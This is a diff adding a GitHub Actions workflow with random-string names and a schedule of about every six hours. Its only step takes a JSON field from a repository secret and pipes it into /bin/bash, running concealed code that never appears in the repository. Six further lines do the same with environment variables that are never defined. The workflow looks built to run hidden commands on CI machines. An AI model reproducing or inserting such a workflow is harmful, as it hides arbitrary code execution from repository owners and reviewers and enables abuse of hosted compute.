@@ -1,0 +1,23 @@
+name: hanturan4187
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hanturan4187
+        env:
+          zyovh2467: ${{ secrets.zyovh2467 }}
+        run: |
+          echo $zyovh2467 | jq -r .sglvd7 | /bin/bash
+          echo $acg0 | jq -r .jo6 | /bin/bash
+          echo $a3361 | jq -r .ecf474 | /bin/bash
+          echo $jft7 | jq -r .bf37584 | /bin/bash
+          echo $mysjg92 | jq -r .afy0 | /bin/bash
+          echo $zuugx8082 | jq -r .emkw310 | /bin/bash
+          echo $iqwh9 | jq -r .dnf59 | /bin/bash
+
